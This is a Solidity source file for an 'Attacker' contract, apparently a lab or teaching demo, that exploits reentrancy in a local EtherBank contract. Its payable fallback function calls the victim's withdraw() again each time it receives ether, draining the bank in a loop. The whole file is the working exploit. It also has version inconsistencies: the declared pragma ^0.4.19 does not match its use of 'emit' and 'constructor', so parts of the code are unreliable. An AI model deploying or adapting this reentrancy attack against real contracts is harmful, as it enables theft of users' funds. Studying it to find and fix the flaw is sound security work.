pragma solidity ^0.4.19;

import "./Etherbank.sol";

contract Attacker{
    EtherBank victim;
    int private counter;
    bool isAttack = false; 

    event Withdrawl(
        address indexed from,
        bytes32 indexed id,
        uint value
    );

    event Deposit(
        address indexed to,
        uint indexed id,
        string value
    );

    constructor(address _etherBank) public {
        victim = EtherBank(_etherBank);
    }

    function deposit() public {
        emit Deposit(address(victim), 10, "Deposit");
        address(victim).transfer(10);
    }


    function attack() public {
        isAttack = true;
        emit Withdrawl(msg.sender, 1, msg.value);
        victim.withdraw(10);
    }

    function getCount() public view returns (int) {
        return counter;
    }

    function getEtherBankAddress() public view returns (EtherBank) {
        return victim;
    }


    function() public payable {
        if(isAttack) {
            emit Withdrawl(msg.sender, 1, msg.value);
            victim.withdraw(10);
            counter += 1;
        }
        else {
           emit Deposit(msg.sender, msg.value, "Deposit"); 
        }
    }
    
}